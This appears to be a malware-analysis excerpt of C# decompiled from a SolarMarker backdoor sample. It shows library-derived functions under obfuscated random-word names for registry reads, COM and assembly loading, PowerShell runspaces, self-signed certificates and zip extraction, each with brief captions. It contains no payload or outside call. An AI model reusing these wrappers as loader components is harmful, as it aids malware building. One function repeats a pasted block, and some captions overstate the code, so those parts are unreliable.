### Some of the decompiled source code scraped from the solarmarker backdoor sample

```cs
public static void OleDbConnect()
	{
                        //IL_0005: Unknown result type (might be due to invalid IL or missing references)
                        ((CodeAccessPermission)new OleDbPermission(PermissionState.Unrestricted)).Demand();
                        IntPtr intPtr = default(IntPtr);
                        Bid.ScopeEnter(ref intPtr, "<oledb.OleDbConnection.ReleaseObjectPool|API>\n");
                        try
                        {
                                OleDbConnectionString.ReleaseObjectPool();
                                OleDbConnectionInternal.ReleaseObjectPool();
                                ((DbConnectionFactory)OleDbConnectionFactory.SingletonInstance).ClearAllPools();
                        }
                        finally
                        {
                                Bid.ScopeLeave(ref intPtr);
                        }
	}
```

```cs
public static ConfigurationSet Heptoxide(DirectoryContext P_0)
	{
                        if (P_0 == null)
                        {
                                throw new ArgumentNullException("context");
                        }
                        if ((int)P_0.get_ContextType() != 3 && (int)P_0.get_ContextType() != 2)
                        {
                                throw new ArgumentException(Res.GetString("TargetShouldBeServerORConfigSet"), "context");
                        }
                        if (!P_0.isServer() && !P_0.isADAMConfigSet())
                        {
                                if ((int)P_0.get_ContextType() == 3)
                                {
                                        throw new ActiveDirectoryObjectNotFoundException(Res.GetString("ConfigSetNotFound"), typeof(ConfigurationSet), P_0.get_Name());
                                }
                                throw new ActiveDirectoryObjectNotFoundException(Res.GetString("AINotFound", new object[1]
                                {
                                        P_0.get_Name()
                                }), typeof(ConfigurationSet), (string)null);
                        }
                        P_0 = new DirectoryContext(P_0);
                        DirectoryEntryManager val = new DirectoryEntryManager(P_0);
                        DirectoryEntry val2 = null;
                        string text = null;
                        try
                        {
                                val2 = val.GetCachedDirectoryEntry((WellKnownDN)0);
                                if (P_0.isServer() && !Utils.CheckCapability(val2, (Capability)1))
                                {
                                        throw new ActiveDirectoryObjectNotFoundException(Res.GetString("AINotFound", new object[1]
                                        {
                                                P_0.get_Name()
                                        }), typeof(ConfigurationSet), (string)null);
                                }P_0 = new DirectoryContext(P_0);
                        DirectoryEntryManager val = new DirectoryEntryManager(P_0);
                        DirectoryEntry val2 = null;
                        string text = null;
                        try
                        {
                                val2 = val.GetCachedDirectoryEntry((WellKnownDN)0);
                                if (P_0.isServer() && !Utils.CheckCapability(val2, (Capability)1))
                                {
                                        throw new ActiveDirectoryObjectNotFoundException(Res.GetString("AINotFound", new object[1]
                                        {
                                                P_0.get_Name()
                                        }), typeof(ConfigurationSet), (string)null);
                                }
                                text = (string)PropertyManager.GetPropertyValue(P_0, val2, PropertyManager.ConfigurationNamingContext);
                        }
                        catch (COMException ex)
                        {
                                int errorCode = ex.ErrorCode;
                                if (errorCode == -2147016646)
                                {
                                        if ((int)P_0.get_ContextType() == 3)
                                        {
                                                throw new ActiveDirectoryObjectNotFoundException(Res.GetString("ConfigSetNotFound"), typeof(ConfigurationSet), P_0.get_Name());
                                        }
                                        throw new ActiveDirectoryObjectNotFoundException(Res.GetString("AINotFound", new object[1]
                                        {
                                                P_0.get_Name()
                                        }), typeof(ConfigurationSet), (string)null);
                                }
                                throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex);
                        }
                        catch (ActiveDirectoryObjectNotFoundException)
                        {
                                if ((int)P_0.get_ContextType() == 3)
                                {
                                        throw new ActiveDirectoryObjectNotFoundException(Res.GetString("ConfigSetNotFound"), typeof(ConfigurationSet), P_0.get_Name());
                                }
                                throw;
                        }
                        return new ConfigurationSet(P_0, text, val);
	}
```

```cs
public static ApplicationPartition Shrip(DirectoryContext P_0, string P_1)
  {
			ApplicationPartition val = null;
			DirectoryEntryManager val2 = null;
			DirectoryContext val3 = null;
			if (P_0 == null)
			{
				throw new ArgumentNullException("context");
			}
			if (P_0.get_Name() == null && !P_0.isRootDomain())
			{
				throw new ArgumentException(Res.GetString("ContextNotAssociatedWithDomain"), "context");
			}
			if (P_0.get_Name() != null && !P_0.isRootDomain() && !P_0.isADAMConfigSet() && !P_0.isServer())
			{
				throw new ArgumentException(Res.GetString("NotADOrADAM"), "context");
			}
			if (P_1 == null)
			{
				throw new ArgumentNullException("distinguishedName");
			}
			if (P_1.Length == 0)
			{
				throw new ArgumentException(Res.GetString("EmptyStringParameter"), "distinguishedName");
			}
			if (!Utils.IsValidDNFormat(P_1))
			{
				throw new ArgumentException(Res.GetString("InvalidDNFormat"), "distinguishedName");
			}
			P_0 = new DirectoryContext(P_0);
			val2 = new DirectoryEntryManager(P_0);
			DirectoryEntry val4 = null;
			try
			{
				val4 = DirectoryEntryManager.GetDirectoryEntry(P_0, val2.ExpandWellKnownDN((WellKnownDN)4));
			}
			catch (COMException ex)
			{
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex);
			}
			catch (ActiveDirectoryObjectNotFoundException)
			{
				throw new ActiveDirectoryOperationException(Res.GetString("ADAMInstanceNotFoundInConfigSet", new object[1]
				{
					P_0.get_Name()
				}));
			}
			StringBuilder stringBuilder = new StringBuilder(15);
			stringBuilder.Append("(&(");
			stringBuilder.Append(PropertyManager.ObjectCategory);
			stringBuilder.Append("=crossRef)(");
			stringBuilder.Append(PropertyManager.SystemFlags);
			stringBuilder.Append(":1.2.840.113556.1.4.804:=");
			stringBuilder.Append(1);
			stringBuilder.Append(")(!(");
			stringBuilder.Append(PropertyManager.SystemFlags);
			stringBuilder.Append(":1.2.840.113556.1.4.803:=");
			stringBuilder.Append(2);
			stringBuilder.Append("))(");
			stringBuilder.Append(PropertyManager.NCName);
			stringBuilder.Append("=");
			stringBuilder.Append(Utils.GetEscapedFilterValue(P_1));
			stringBuilder.Append("))");
			string text = stringBuilder.ToString();
			ADSearcher val6 = new ADSearcher(val4, text, new string[2]
			{
				PropertyManager.DnsRoot,
				PropertyManager.NCName
			}, (SearchScope)1, false, false);
			SearchResult val7 = null;
			try
			{
				val7 = val6.FindOne();
			}
			catch (COMException ex2)
			{
				if (ex2.ErrorCode == -2147016656)
				{
					throw new ActiveDirectoryObjectNotFoundException(Res.GetString("AppNCNotFound"), typeof(ApplicationPartition), P_1);
				}
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex2);
			}
			finally
			{
				((Component)val4).Dispose();
			}
			if (val7 == null)
			{
				throw new ActiveDirectoryObjectNotFoundException(Res.GetString("AppNCNotFound"), typeof(ApplicationPartition), P_1);
			}
			string text2 = null;
			try
			{
				text2 = ((((ReadOnlyCollectionBase)val7.get_Properties().get_Item(PropertyManager.DnsRoot)).get_Count() > 0) ? ((string)val7.get_Properties().get_Item(PropertyManager.DnsRoot).get_Item(0)) : null);
			}
			catch (COMException ex3)
			{
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex3);
			}
			ApplicationPartitionType applicationPartitionType = ApplicationPartition.GetApplicationPartitionType(P_0);
			if ((int)P_0.get_ContextType() == 2)
			{
				bool flag = false;
				DistinguishedName val8 = new DistinguishedName(P_1);
				DirectoryEntry directoryEntry = DirectoryEntryManager.GetDirectoryEntry(P_0, (WellKnownDN)0);
				try
				{
					foreach (string item in (CollectionBase)directoryEntry.get_Properties().get_Item(PropertyManager.NamingContexts))
					{
						DistinguishedName val9 = new DistinguishedName(item);
						if (val9.Equals(val8))
						{
							flag = true;
							break;
						}
					}
				}
				catch (COMException ex4)
				{
					throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex4);
				}
				finally
				{
					((Component)directoryEntry).Dispose();
				}
				if (!flag)
				{
					throw new ActiveDirectoryObjectNotFoundException(Res.GetString("AppNCNotFound"), typeof(ApplicationPartition), P_1);
				}
				val3 = P_0;
			}
			else if ((int)applicationPartitionType == 0)
			{
				int num = 0;
				DomainControllerInfo val10 = default(DomainControllerInfo);
				num = Locator.DsGetDcNameWrapper((string)null, text2, (string)null, 32768L, ref val10);
				switch (num)
				{
				case 1355:
					throw new ActiveDirectoryObjectNotFoundException(Res.GetString("AppNCNotFound"), typeof(ApplicationPartition), P_1);
				default:
					throw ExceptionHelper.GetExceptionFromErrorCode(num);
				case 0:
					break;
				}
				string text4 = val10.DomainControllerName.Substring(2);
				val3 = Utils.GetNewDirectoryContext(text4, (DirectoryContextType)2, P_0);
			}
			else
			{
				string name = ((DirectoryServer)ConfigurationSet.FindOneAdamInstance(P_0.get_Name(), P_0, P_1, (string)null)).get_Name();
				val3 = Utils.GetNewDirectoryContext(name, (DirectoryContextType)2, P_0);
			}
			return new ApplicationPartition(val3, (string)PropertyManager.GetSearchResultPropertyValue(val7, PropertyManager.NCName), text2, applicationPartitionType, val2);
  }
```

```cs
public static ActiveDirectoryRoleFactoryConfiguration Boltstrake()
	{
			return ActiveDirectoryRoleFactory.s_configuration;
	}
```

```cs
public static ActiveDirectorySiteLink Vinomethylic(DirectoryContext P_0, string P_1, ActiveDirectoryTransportType P_2)
	{
			ActiveDirectorySiteLink.ValidateArgument(P_0, P_1, P_2);
			P_0 = new DirectoryContext(P_0);
			DirectoryEntry directoryEntry;
			try
			{
				directoryEntry = DirectoryEntryManager.GetDirectoryEntry(P_0, (WellKnownDN)0);
				string str = (string)PropertyManager.GetPropertyValue(P_0, directoryEntry, PropertyManager.ConfigurationNamingContext);
				string str2 = "CN=Inter-Site Transports,CN=Sites," + str;
				str2 = (((int)P_2 != 0) ? ("CN=SMTP," + str2) : ("CN=IP," + str2));
				directoryEntry = DirectoryEntryManager.GetDirectoryEntry(P_0, str2);
			}
			catch (COMException ex)
			{
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex);
			}
			catch (ActiveDirectoryObjectNotFoundException)
			{
				throw new ActiveDirectoryOperationException(Res.GetString("ADAMInstanceNotFoundInConfigSet", new object[1]
				{
					P_0.get_Name()
				}));
			}
			try
			{
				ADSearcher val2 = new ADSearcher(directoryEntry, "(&(objectClass=siteLink)(objectCategory=SiteLink)(name=" + Utils.GetEscapedFilterValue(P_1) + "))", new string[1]
				{
					"distinguishedName"
				}, (SearchScope)1, false, false);
				SearchResult val3 = val2.FindOne();
				if (val3 == null)
				{
					Exception ex2 = (Exception)new ActiveDirectoryObjectNotFoundException(Res.GetString("DSNotFound"), typeof(ActiveDirectorySiteLink), P_1);
					throw ex2;
				}
				DirectoryEntry directoryEntry2 = val3.GetDirectoryEntry();
				return new ActiveDirectorySiteLink(P_0, P_1, P_2, true, directoryEntry2);
			}
			catch (COMException ex3)
			{
				if (ex3.ErrorCode == -2147016656)
				{
					DirectoryEntry directoryEntry3 = DirectoryEntryManager.GetDirectoryEntry(P_0, (WellKnownDN)0);
					if (Utils.CheckCapability(directoryEntry3, (Capability)1) && (int)P_2 == 1)
					{
						throw new NotSupportedException(Res.GetString("NotSupportTransportSMTP"));
					}
					throw new ActiveDirectoryObjectNotFoundException(Res.GetString("DSNotFound"), typeof(ActiveDirectorySiteLink), P_1);
				}
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex3);
			}
			finally
			{
				((Component)directoryEntry).Dispose();
			}
	}
```

```cs
public static ActiveDirectorySchemaProperty Eunuchised(DirectoryContext P_0, string P_1)
	{
			//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00db: Expected O, but got Unknown
			//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ee: Expected O, but got Unknown
			ActiveDirectorySchemaProperty val = null;
			if (P_0 == null)
			{
				throw new ArgumentNullException("context");
			}
			if (P_0.get_Name() == null && !P_0.isRootDomain())
			{
				throw new ArgumentException(Res.GetString("ContextNotAssociatedWithDomain"), "context");
			}
			if (P_0.get_Name() != null && !P_0.isRootDomain() && !P_0.isADAMConfigSet() && !P_0.isServer())
			{
				throw new ArgumentException(Res.GetString("NotADOrADAM"), "context");
			}
			if (P_1 == null)
			{
				throw new ArgumentNullException("ldapDisplayName");
			}
			if (P_1.Length == 0)
			{
				throw new ArgumentException(Res.GetString("EmptyStringParameter"), "ldapDisplayName");
			}
			P_0 = new DirectoryContext(P_0);
			return new ActiveDirectorySchemaProperty(P_0, P_1, (DirectoryEntry)null, (DirectoryEntry)null);
	}
```

```cs
public static ApplicationPartition Inborn(DirectoryContext P_0)
	{
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Invalid comparison between Unknown and I4
			//IL_0067: Unknown result type (might be due to invalid IL or missing references)
			//IL_0071: Unknown result type (might be due to invalid IL or missing references)
			//IL_007a: Expected O, but got Unknown
			//IL_0090: Unknown result type (might be due to invalid IL or missing references)
			//IL_0099: Expected O, but got Unknown
			//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
			//IL_012c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0132: Expected O, but got Unknown
			if (P_0 == null)
			{
				throw new ArgumentNullException("context");
			}
			if ((int)P_0.get_ContextType() != 4)
			{
				throw new ArgumentException(Res.GetString("TargetShouldBeAppNCDnsName"), "context");
			}
			if (!P_0.isNdnc())
			{
				throw new ActiveDirectoryObjectNotFoundException(Res.GetString("NDNCNotFound"), typeof(ApplicationPartition), P_0.get_Name());
			}
			P_0 = new DirectoryContext(P_0);
			string dNFromDnsName = Utils.GetDNFromDnsName(P_0.get_Name());
			DirectoryEntryManager val = new DirectoryEntryManager(P_0);
			DirectoryEntry val2 = null;
			try
			{
				val2 = val.GetCachedDirectoryEntry(dNFromDnsName);
				val2.Bind(true);
			}
			catch (COMException ex)
			{
				int errorCode = ex.ErrorCode;
				if (errorCode == -2147016646)
				{
					throw new ActiveDirectoryObjectNotFoundException(Res.GetString("NDNCNotFound"), typeof(ApplicationPartition), P_0.get_Name());
				}
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex);
			}
			return new ApplicationPartition(P_0, dNFromDnsName, P_0.get_Name(), (ApplicationPartitionType)0, val);
	}
```

```cs
public static ActiveDirectorySiteLinkBridge Prelingual(DirectoryContext P_0, string P_1, ActiveDirectoryTransportType P_2)
	{
			ActiveDirectorySiteLinkBridge.ValidateArgument(P_0, P_1, P_2);
			P_0 = new DirectoryContext(P_0);
			DirectoryEntry directoryEntry;
			try
			{
				directoryEntry = DirectoryEntryManager.GetDirectoryEntry(P_0, (WellKnownDN)0);
				string str = (string)PropertyManager.GetPropertyValue(P_0, directoryEntry, PropertyManager.ConfigurationNamingContext);
				string str2 = "CN=Inter-Site Transports,CN=Sites," + str;
				str2 = (((int)P_2 != 0) ? ("CN=SMTP," + str2) : ("CN=IP," + str2));
				directoryEntry = DirectoryEntryManager.GetDirectoryEntry(P_0, str2);
			}
			catch (COMException ex)
			{
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex);
			}
			catch (ActiveDirectoryObjectNotFoundException)
			{
				throw new ActiveDirectoryOperationException(Res.GetString("ADAMInstanceNotFoundInConfigSet", new object[1]
				{
					P_0.get_Name()
				}));
			}
			try
			{
				ADSearcher val2 = new ADSearcher(directoryEntry, "(&(objectClass=siteLinkBridge)(objectCategory=SiteLinkBridge)(name=" + Utils.GetEscapedFilterValue(P_1) + "))", new string[1]
				{
					"distinguishedName"
				}, (SearchScope)1, false, false);
				SearchResult val3 = val2.FindOne();
				if (val3 == null)
				{
					Exception ex2 = (Exception)new ActiveDirectoryObjectNotFoundException(Res.GetString("DSNotFound"), typeof(ActiveDirectorySiteLinkBridge), P_1);
					throw ex2;
				}
				DirectoryEntry directoryEntry2 = val3.GetDirectoryEntry();
				ActiveDirectorySiteLinkBridge val4 = new ActiveDirectorySiteLinkBridge(P_0, P_1, P_2, true);
				val4.cachedEntry = directoryEntry2;
				return val4;
			}
			catch (COMException ex3)
			{
				if (ex3.ErrorCode == -2147016656)
				{
					DirectoryEntry directoryEntry3 = DirectoryEntryManager.GetDirectoryEntry(P_0, (WellKnownDN)0);
					if (Utils.CheckCapability(directoryEntry3, (Capability)1) && (int)P_2 == 1)
					{
						throw new NotSupportedException(Res.GetString("NotSupportTransportSMTP"));
					}
					throw new ActiveDirectoryObjectNotFoundException(Res.GetString("DSNotFound"), typeof(ActiveDirectorySiteLinkBridge), P_1);
				}
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex3);
			}
			finally
			{
				((Component)directoryEntry).Dispose();
			}
	}
```

```cs
public static ActiveDirectorySiteLinkBridge Judaism(DirectoryContext P_0, string P_1, ActiveDirectoryTransportType P_2)
	{
			ActiveDirectorySiteLinkBridge.ValidateArgument(P_0, P_1, P_2);
			P_0 = new DirectoryContext(P_0);
			DirectoryEntry directoryEntry;
			try
			{
				directoryEntry = DirectoryEntryManager.GetDirectoryEntry(P_0, (WellKnownDN)0);
				string str = (string)PropertyManager.GetPropertyValue(P_0, directoryEntry, PropertyManager.ConfigurationNamingContext);
				string str2 = "CN=Inter-Site Transports,CN=Sites," + str;
				str2 = (((int)P_2 != 0) ? ("CN=SMTP," + str2) : ("CN=IP," + str2));
				directoryEntry = DirectoryEntryManager.GetDirectoryEntry(P_0, str2);
			}
			catch (COMException ex)
			{
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex);
			}
			catch (ActiveDirectoryObjectNotFoundException)
			{
				throw new ActiveDirectoryOperationException(Res.GetString("ADAMInstanceNotFoundInConfigSet", new object[1]
				{
					P_0.get_Name()
				}));
			}
			try
			{
				ADSearcher val2 = new ADSearcher(directoryEntry, "(&(objectClass=siteLinkBridge)(objectCategory=SiteLinkBridge)(name=" + Utils.GetEscapedFilterValue(P_1) + "))", new string[1]
				{
					"distinguishedName"
				}, (SearchScope)1, false, false);
				SearchResult val3 = val2.FindOne();
				if (val3 == null)
				{
					Exception ex2 = (Exception)new ActiveDirectoryObjectNotFoundException(Res.GetString("DSNotFound"), typeof(ActiveDirectorySiteLinkBridge), P_1);
					throw ex2;
				}
				DirectoryEntry directoryEntry2 = val3.GetDirectoryEntry();
				ActiveDirectorySiteLinkBridge val4 = new ActiveDirectorySiteLinkBridge(P_0, P_1, P_2, true);
				val4.cachedEntry = directoryEntry2;
				return val4;
			}
			catch (COMException ex3)
			{
				if (ex3.ErrorCode == -2147016656)
				{
					DirectoryEntry directoryEntry3 = DirectoryEntryManager.GetDirectoryEntry(P_0, (WellKnownDN)0);
					if (Utils.CheckCapability(directoryEntry3, (Capability)1) && (int)P_2 == 1)
					{
						throw new NotSupportedException(Res.GetString("NotSupportTransportSMTP"));
					}
					throw new ActiveDirectoryObjectNotFoundException(Res.GetString("DSNotFound"), typeof(ActiveDirectorySiteLinkBridge), P_1);
				}
				throw ExceptionHelper.GetExceptionFromCOMException(P_0, ex3);
			}
			finally
			{
				((Component)directoryEntry).Dispose();
			}
	}
```

#### Checks if IIS Service is enabled
```cs
public static bool CheckIISService()
	{
			try
			{
				RegistryKey val = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\InetStp");
				if (val != null)
				{
					val.GetValue("MajorVersion");
					val.GetValue("MinorVersion");
					RegistryKey val2 = val.OpenSubKey("Components");
					if (val2 != null && (int)val2.GetValue("W3SVC") != 0)
					{
						return true;
					}
				}
			}
			catch (IOException)
			{
				return false;
			}
			return false;
	}
```

```cs
public static string[] Undergraduateship()
	{
			RegistryKey val = null;
			RegistryKey val2 = null;
			string[] array = null;
			RegistryPermission val3 = new RegistryPermission((RegistryPermissionAccess)1, "HKEY_LOCAL_MACHINE\\HARDWARE\\DEVICEMAP\\SERIALCOMM");
			((CodeAccessPermission)val3).Assert();
			try
			{
				val = Registry.LocalMachine;
				val2 = val.OpenSubKey("HARDWARE\\DEVICEMAP\\SERIALCOMM", false);
				if (val2 != null)
				{
					string[] valueNames = val2.GetValueNames();
					array = new string[valueNames.Length];
					for (int i = 0; i < valueNames.Length; i++)
					{
						array[i] = (string)val2.GetValue(valueNames[i]);
					}
				}
			}
			finally
			{
				if (val != null)
				{
					val.Close();
				}
				if (val2 != null)
				{
					val2.Close();
				}
				CodeAccessPermission.RevertAssert();
			}
			if (array == null)
			{
				array = new string[0];
			}
			return array;
	}
```

COM Interaction

```cs
public static Type Cypseli(Guid P_0)
	{
			string text = "software\\classes\\clsid\\{" + P_0.ToString() + "}\\InprocServer32";
			RegistryKey val = Registry.LocalMachine.OpenSubKey(text, false);
			try
			{
				if (val != null)
				{
					RegistryKey val2 = val.OpenSubKey(typeof(TypeCacheManager).Assembly.ImageRuntimeVersion);
					try
					{
						string text2 = null;
						if (val2 == null)
						{
							text = null;
							string[] subKeyNames = val.GetSubKeyNames();
							foreach (string text3 in subKeyNames)
							{
								text = text3;
								if (string.IsNullOrEmpty(text))
								{
									continue;
								}
								RegistryKey val3 = val.OpenSubKey(text);
								try
								{
									text2 = (string)val3.GetValue("Assembly");
									if (string.IsNullOrEmpty(text2))
									{
										continue;
									}
								}
								finally
								{
									((IDisposable)val3)?.Dispose();
								}
								break;
							}
						}
						else
						{
							text2 = (string)val2.GetValue("Assembly");
						}
						if (string.IsNullOrEmpty(text2))
						{
							return null;
						}
						Assembly assembly = Assembly.Load(text2);
						Type[] types = assembly.GetTypes();
						foreach (Type type in types)
						{
							if (type.IsClass && type.GUID == P_0)
							{
								return type;
							}
						}
						return null;
					}
					finally
					{
						((IDisposable)val2)?.Dispose();
					}
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			RegistryHandle bitnessHKCR = RegistryHandle.GetBitnessHKCR((IntPtr.Size != 8) ? true : false);
			try
			{
				if (bitnessHKCR != null)
				{
					RegistryHandle val4 = bitnessHKCR.OpenSubKey("CLSID\\{" + P_0.ToString() + "}\\InprocServer32");
					try
					{
						RegistryHandle val5 = val4.OpenSubKey(typeof(TypeCacheManager).Assembly.ImageRuntimeVersion);
						try
						{
							string text4 = null;
							if (val5 == null)
							{
								text = null;
								StringEnumerator enumerator = val4.GetSubKeyNames().GetEnumerator();
								try
								{
									while (enumerator.MoveNext())
									{
										string current = enumerator.get_Current();
										text = current;
										if (string.IsNullOrEmpty(text))
										{
											continue;
										}
										RegistryHandle val6 = val4.OpenSubKey(text);
										try
										{
											text4 = val6.GetStringValue("Assembly");
											if (string.IsNullOrEmpty(text4))
											{
												continue;
											}
										}
										finally
										{
											((IDisposable)val6)?.Dispose();
										}
										break;
									}
								}
								finally
								{
									(enumerator as IDisposable)?.Dispose();
								}
							}
							else
							{
								text4 = val5.GetStringValue("Assembly");
							}
							if (string.IsNullOrEmpty(text4))
							{
								return null;
							}
							Assembly assembly2 = Assembly.Load(text4);
							Type[] types2 = assembly2.GetTypes();
							foreach (Type type2 in types2)
							{
								if (type2.IsClass && type2.GUID == P_0)
								{
									return type2;
								}
							}
							return null;
						}
						finally
						{
							((IDisposable)val5)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)val4)?.Dispose();
					}
				}
			}
			finally
			{
				((IDisposable)bitnessHKCR)?.Dispose();
			}
			return null;
	}
```

```cs
public static MemoryMappedFile Arietta(FileStream P_0, string P_1, long P_2, MemoryMappedFileAccess P_3, HandleInheritability P_4, bool P_5)
		{
			return MemoryMappedFile.CreateFromFile(P_0, P_1, P_2, P_3, (MemoryMappedFileSecurity)null, P_4, P_5);
		}
```

#### Creates a PowerShell runspace

```cs
public static RunspacePool Assientist(int P_0, int P_1, RunspaceConnectionInfo P_2)
	{
			return RunspaceFactory.CreateRunspacePool(P_0, P_1, P_2, (PSHost)null);
	}
```

```cs
public static IEnumerable<CompletionResult> Prostatometer(string P_0)
	{
			if (Runspace.get_DefaultRunspace() == null)
			{
				return CommandCompletion.EmptyCompletionResult;
			}
			CompletionExecutionHelper helper = new CompletionExecutionHelper(PowerShell.Create((RunspaceMode)0));
			CompletionContext val = new CompletionContext();
			val.set_WordToComplete(P_0);
			val.set_Helper(helper);
			return CompletionCompleters.CompleteFilename(val);
	}
```

#### Creates a self signed certificate
```cs
public static SelfSignedCertificate Polymerization(string P_0, string P_1)
	{
			return SelfSignedCertificate.Create(P_0, P_1, DateTime.UtcNow, DateTime.UtcNow.AddYears(2), Guid.NewGuid().ToString());
	}
```

#### Loads dll using `Assembly.LoadFile`
```cs
public static MdsExtension Guestless(string P_0, string P_1, Dictionary<string, string> P_2)
	{
			string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
			string path = Path.Combine(directoryName, P_1 + ".dll");
			Assembly assembly = Assembly.LoadFile(path);
			string fullExtensionName = MdsExtension.GetFullExtensionName(assembly, P_1);
			MdsExtension val = (MdsExtension)assembly.CreateInstance(fullExtensionName);
			val.Package = P_0;
			val.Extension = P_1;
			val.InitializeClient(P_2);
			return val;
	}
```

#### Manages one or more remote instances of SQL Server.
```cs
public static string Micasts(string P_0)
	{
			return SqmUtility.CreateSqmFilePatterns(P_0, (PathForFile)0);
	}
```

#### Retrieves a zip archive, extracts data out and adds content to directory.

```cs
public static void Murderously(ZipArchive P_0, string P_1)
	{
			if (P_0 == null)
			{
				throw new ArgumentNullException("source");
			}
			if (P_1 == null)
			{
				throw new ArgumentNullException("destinationDirectoryName");
			}
			DirectoryInfo val = Directory.CreateDirectory(P_1); // directory
			string text = ((FileSystemInfo)val).get_FullName(); // get file name
			if (!LocalAppContextSwitches.get_DoNotAddTrailingSeparator())
			{
				int length = text.Length;
				if (length != 0 && text[length - 1] != Path.DirectorySeparatorChar)
				{
					string str = text;
					char directorySeparatorChar = Path.DirectorySeparatorChar;
					text = str + directorySeparatorChar;
				}
			}
			foreach (ZipArchiveEntry entry in P_0.Entries)
			{
				string fullPath = Path.GetFullPath(Path.Combine(text, entry.FullName)); //gets full path of each entry and filename
				if (!fullPath.StartsWith(text, StringComparison.OrdinalIgnoreCase))
				{
					throw new IOException(SR.GetString("IO_ExtractingResultsInOutside"));
				}
				if (Path.GetFileName(fullPath)!.Length == 0)
				{
					if (entry.Length != 0L)
					{
						throw new IOException(SR.GetString("IO_DirectoryNameWithData"));
					}
					Directory.CreateDirectory(fullPath);
				}
				else
				{
					Directory.CreateDirectory(Path.GetDirectoryName(fullPath));
					ZipFileExtensions.ExtractToFile(entry, fullPath, false); //extracts file to new directory
				}
			}
	}
```

#### Creates a Azure Service Bus to send data

```cs
public static Uri Okupukupu(string P_0, string P_1, string P_2, bool P_3)
	{
			return ServiceBusEnvironment.CreateServiceUri(P_0, P_1, P_2, P_3, RelayEnvironment.get_RelayHostRootName());
	}
```

#### A CIM session is a client-side object representing a connection to a local computer or a remote computer.

```cs
public static CimAsyncResult<CimSession> Tonite(string P_0)
	{
			return CimSession.CreateAsync(P_0, (CimSessionOptions)null);
	}
```

Interaction with speech recognition

```cs
public static ReadOnlyCollection<RecognizerInfo> Mutagens()
	{
			List<RecognizerInfo> list = new List<RecognizerInfo>();
			ObjectTokenCategory val = ObjectTokenCategory.Create("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Speech\\Recognizers");
			try
			{
				if (val != null)
				{
					foreach (ObjectToken item in (IEnumerable<ObjectToken>)val)
					{
						RecognizerInfo val2 = RecognizerInfo.Create(item);
						if (val2 != null)
						{
							list.Add(val2);
						}
					}
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return new ReadOnlyCollection<RecognizerInfo>(list);
	}
```

#### More COM Interaction

```cs
public static ComObject Unleagued(object P_0)
	{
			object comObjectData = Marshal.GetComObjectData(P_0, ComObject._ComObjectInfoKey);
			if (comObjectData != null)
			{
				return (ComObject)comObjectData;
			}
			lock (ComObject._ComObjectInfoKey)
			{
				comObjectData = Marshal.GetComObjectData(P_0, ComObject._ComObjectInfoKey);
				if (comObjectData != null)
				{
					return (ComObject)comObjectData;
				}
				ComObject val = ComObject.CreateComObject(P_0);
				if (!Marshal.SetComObjectData(P_0, ComObject._ComObjectInfoKey, val))
				{
					throw Error.SetComObjectDataFailed();
				}
				return val;
			}
	}
```

```cs
public static void Tonsillitis(JET_SESID P_0, string P_1, string P_2, ref JET_DBID P_3, CreateDatabaseGrbit P_4)
	{
			Api.Check(Api.get_Impl().JetCreateDatabase(P_0, P_1, P_2, ref P_3, P_4));
	}
```

```cs
public static object Arachin(XamlReader P_0, bool P_1, object P_2, XamlAccessLevel P_3, Uri P_4)
	{
			XamlObjectWriterSettings val = XamlReader.CreateObjectWriterSettingsForBaml();
			val.set_RootObjectInstance(P_2);
			val.set_AccessLevel(P_3);
			object obj = WpfXamlLoader.Load(P_0, (IXamlObjectWriterFactory)null, P_1, P_2, val, P_4);
			WpfXamlLoader.EnsureXmlNamespaceMaps(obj, P_0.get_SchemaContext());
			return obj;
	}
```
